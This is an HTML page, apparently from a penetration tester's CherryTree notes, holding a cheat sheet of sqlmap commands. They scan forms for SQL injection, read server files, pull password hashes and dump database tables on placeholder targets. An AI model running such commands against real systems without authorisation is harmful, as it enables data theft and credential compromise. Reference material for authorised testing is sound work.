@@ -1,0 +1,14 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>14. SQLMap Examples</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>14. SQLMap Examples</h1><br/><br />sqlmap is an open source penetration testing tool that automates the  process of detecting and exploiting SQL injection flaws and taking over  of database servers. It comes with a powerful detection engine, many  niche features for the ultimate penetration tester and a broad range of  switches lasting from database fingerprinting, over data fetching from  the database, to accessing the underlying file system and executing  commands on the operating system via out-of-band connections.<br /><br /><table class="table"><tr><th>Command</th><th>Description</th></tr><tr><td>sqlmap -u http://meh.com –forms –batch –crawl=10
+–cookie=jsessionid=54321 –level=5 –risk=3</td><td>Automated sqlmap scan</td></tr><tr><td>sqlmap -u TARGET -p PARAM –data=POSTDATA –cookie=COOKIE
+–level=3 –current-user –current-db –passwords
+–file-read=”/var/www/blah.php”</td><td>Targeted sqlmap scan</td></tr><tr><td>sqlmap -u “http://meh.com/meh.php?id=1”
+–dbms=mysql –tech=U –random-agent –dump</td><td>Scan url for union + error based injection with mysql backend
+and use a random user agent + database dump</td></tr><tr><td>sqlmap -o -u “http://meh.com/form/” –forms</td><td>sqlmap check form for injection</td></tr><tr><td>sqlmap -o -u “http://meh/vuln-form” –forms
+-D database-name -T users –dump</td><td>sqlmap dump and crack hashes for table users on database-name.</td></tr></table><br /><p align="center"><img src="images/home.svg" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>
